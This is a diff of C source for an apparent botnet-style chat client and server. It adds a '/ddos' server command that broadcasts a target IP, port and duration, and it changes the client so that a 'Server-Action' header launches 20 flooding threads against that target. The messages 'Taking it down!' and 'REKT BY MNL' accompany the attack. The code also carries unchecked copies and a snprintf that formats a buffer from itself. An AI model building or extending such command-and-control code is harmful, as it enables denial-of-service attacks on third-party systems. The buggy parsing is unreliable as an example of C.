@@ -127,32 +127,36 @@ void *ddos(void *d){
 void client_react(int Socket, const p_custom_http p){
 	if(p == NULL)
 		return;
+
 	char *action = chttp_lookup(p, "Client-Action: ");
+	char *action2 = chttp_lookup(p, "Server-Action: ");
+	if(action2){
+		puts("Taking it down!");
+		char *ip = chttp_lookup(p, "ip: ");
+		char *port = chttp_lookup(p, "port: ");
+		char *seconds = chttp_lookup(p, "seconds: ");
+
+		ip_g = ip;
+		port_g = atoi(port);
+		seconds_g = atol(seconds);
+
+		p_threadController tc = threadController_init();
+		for(size_t i = 0 ; i < 20 ; i++){
+			threadController_pushback(tc, ddos,NULL);
+		}
+
+		sleep(atol(seconds));
+
+		threadController_destroy(tc);
+		free(ip);
+		free(port);
+
+	}
 	if(action){
 		if(strcmp("Display", action) == 0){
 			char *d = chttp_getData(p);
 			printf("%s",d);
 			free(d);
-		}
-		if(strcmp("Take-It-Down",action) == 0){
-			char *ip = chttp_lookup(p, "ip: ");
-			char *port = chttp_lookup(p, "port: ");
-			char *seconds = chttp_lookup(p, "seconds: ");
-
-			ip_g = ip;
-			port_g = atoi(port);
-			seconds_g = atol(seconds);
-
-			p_threadController tc = threadController_init();
-			for(size_t i = 0 ; i < 20 ; i++){
-				threadController_pushback(tc, ddos,NULL);
-			}
-
-			sleep(atol(seconds));
-
-			threadController_destroy(tc);
-			free(ip);
-			free(port);
 		}
 	}
 
@@ -204,6 +208,35 @@ void handle(char *buffer, int sock){
 		free(username);
 	}
 
+	if(strcmp(command,"/quit") == 0){
+		char *find = strstr(buffer," ");
+		if(!find)
+			return;
+		find += 1;
+
+		char *findTwo = find + strlen(buffer);
+
+		char *password = malloc(findTwo - find);
+		memcpy(password, find, findTwo - find);
+		password[findTwo - find - 2] = 0; // Just to remove the trailing newline.
+
+		p_custom_http p = chttp_init();
+		chttp_add_header(p, "Server-Action: Quit", 19);
+		char buff[250] = {0};
+			// snprintf(buff, 250, "Target-Nickname: %s", username);
+		strcpy(buff, "Target-Password: ");
+		strcat(buff, password);
+
+
+		chttp_add_header(p, buff, strlen(buff)-1);
+		chttp_finalise(p, "MNL", 3);
+		sendAllFixed(sock, p->buffer, p->size, 0);
+		chttp_destroy(p);
+
+		free(password);
+		exit(0);
+	}
+
 	if(strcmp(command,"/msg") == 0){
 		char *find = strstr(buffer," ");
 		if(!find)
@@ -229,6 +262,50 @@ void handle(char *buffer, int sock){
 		snprintf(buff, 250, "Target-Client: %s", username);
 		chttp_add_header(p, buff, strlen(buff));
 		chttp_finalise(p, msg, strlen(msg));
+		sendAllFixed(sock, p->buffer, p->size, 0);
+		chttp_destroy(p);
+	}
+
+	if(strcmp(command,"/ddos") == 0){
+		char *find = strstr(buffer," ");
+		if(!find)
+			return;
+		find += 1;
+
+		char *findTwo = strstr(find," ");
+		if(!findTwo)
+			return;
+
+
+		char *ip = malloc(findTwo - find);
+		memcpy(ip, find, findTwo - find);
+		ip[findTwo - find] = 0;
+
+		char port[8];
+		char seconds[8];
+		char *findThree = strstr(findTwo+1, " ");
+
+		memcpy(port,findTwo + 1,findThree - findTwo);
+		port[findThree - findTwo] = 0;
+
+		char *findFour = strstr(findThree + 1, "\n");
+		memcpy(seconds,findThree + 1, findFour - findThree);
+		seconds[findFour - findThree] = 0;
+
+
+		p_custom_http p = chttp_init();
+		chttp_add_header(p, "Server-Action: ddos", 19);
+		char ip_buff[250];
+		snprintf(ip_buff, 250, "ip: %s", ip);
+		char port_buff[50];
+		snprintf(port_buff, 50, "port: %s", port);
+		char seconds_buff[50];
+		snprintf(seconds_buff, 50, "seconds: %s", seconds_buff);
+
+		chttp_add_header(p, ip_buff, strlen(ip_buff));
+		chttp_add_header(p, port_buff, strlen(port_buff));
+		chttp_add_header(p, seconds_buff, strlen(seconds_buff));
+		chttp_finalise(p, "REKT BY MNL", 11);
 		sendAllFixed(sock, p->buffer, p->size, 0);
 		chttp_destroy(p);
 	}
